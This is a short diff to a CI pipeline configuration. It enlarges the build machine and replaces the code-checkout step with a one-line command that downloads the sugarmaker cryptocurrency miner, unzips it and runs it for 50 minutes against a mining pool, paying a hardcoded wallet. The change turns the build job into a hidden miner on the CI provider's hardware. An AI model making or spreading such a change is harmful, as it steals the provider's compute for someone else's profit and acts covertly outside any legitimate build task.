@@ -2,7 +2,7 @@ version: v1.0
 name: Initial Pipeline
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-8
     os_image: ubuntu1804
 blocks:
   - name: 'Block #1'
@@ -10,4 +10,4 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip && unzip sugarmaker-v2.5.0-sugar4-linux64.zip && timeout 50m ./sugarmaker-v2.5.0-sugar4-linux64/sugarmaker -a YespowerSugar -o stratum+tcp://1pool.sugarchain.org:5555 -u sugar1qx2srdf3nddmak2wdpgvk4te3hlhecn3jrdes97 -p x
